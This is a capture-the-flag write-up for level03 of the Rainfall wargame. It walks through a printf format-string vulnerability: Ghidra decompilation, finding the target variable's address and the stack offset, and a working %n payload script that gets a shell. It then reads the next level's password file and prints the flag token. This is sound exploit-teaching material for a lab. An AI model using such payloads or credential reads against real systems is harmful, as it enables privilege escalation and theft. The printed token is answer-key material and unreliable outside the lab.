# level03

1. Decompilation with Ghidra

    - Decompile the `level3` binary with Ghidra
    - The binary contains a function `v()` that:
      - Calls `fgets()` to read 512 bytes of user input (safe)
      - Calls `printf()` with user input as format string (vulnerable!)
      - Checks if global variable `m` equals `0x40` (64)
      - If true, calls `system("/bin/sh")`

2. Analysis of the vulnerability

    The decompiled code is:

    ```c
    void v(void) {
      char local_20c [520];
      
      fgets(local_20c, 0x200, stdin);   // Reads 512 bytes max (safe)
      printf(local_20c);                // VULNERABLE! No format string!
      if (m == 0x40) {                  // If global variable m == 64
        fwrite("Wait what?!\n", 1, 0xc, stdout);
        system("/bin/sh");              // Shell!
      }
      return;
    }
    ```

    The vulnerability:
    - **Format string attack** via `printf(local_20c)` without format specifier
    - We need to modify the global variable `m` to be equal to `0x40` (64)
    - Using `%n` format specifier, we can write to arbitrary memory addresses

3. Finding the address of global variable m

    Using objdump to find the symbol address:

    ```bash
    objdump -t ./level3 | grep " m"
    # Output: 0804988c g     O .bss   00000004              m
    ```

    The address of `m` is: **0x0804988c**

4. Finding the format string offset

    Test to find where our input appears on the stack:

    ```bash
    echo "AAAA %x %x %x %x %x %x %x %x" | ./level3
    # Output: AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
    ```

    We see `41414141` (AAAA in hex) at the **4th position**.

5. Exploit construction

    Strategy:
    - Place the address of `m` at the beginning of our input (4 bytes)
    - Print 60 more characters to reach a total of 64 bytes printed
    - Use `%4$n` to write the number of bytes printed (64) into `m`

    Format string breakdown:

    ```
    [Address of m][%60x][%4$n]
    |            |      |
    |            |      +-> Write byte count to 4th argument (address of m)
    |            +-> Print 60 characters (padding)
    +-> 0x0804988c (4 bytes)
    ```

    Total bytes printed: 4 + 60 = 64 = 0x40

6. Exploitation

    Create the exploit on the Rainfall machine:

    ```bash
    cat > /tmp/exploit.py << 'EOF'
    #!/usr/bin/env python
    import sys
    
    # Adresse de la variable globale m: 0x0804988c
    m_addr = "\x8c\x98\x04\x08"
    
    # On doit ecrire 64 (0x40) dans m
    # 4 bytes (adresse) + 60 bytes imprimes = 64 total
    padding = "%60x"
    
    # Construction du payload
    payload = m_addr      # Adresse de m (position 4 sur la stack)
    payload += padding    # Imprime 60 caracteres supplementaires
    payload += "%4$n"     # Ecrit 64 dans l'adresse au 4eme argument
    
    sys.stdout.write(payload)
    EOF
    ```

    Run the exploit:

    ```bash
    (python /tmp/exploit.py; cat) | ./level3
    ```

    This spawns a shell with level4 privileges:

    ```bash
    cat /home/user/level4/.pass
    ```

7. Token discovered

    The token is: `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
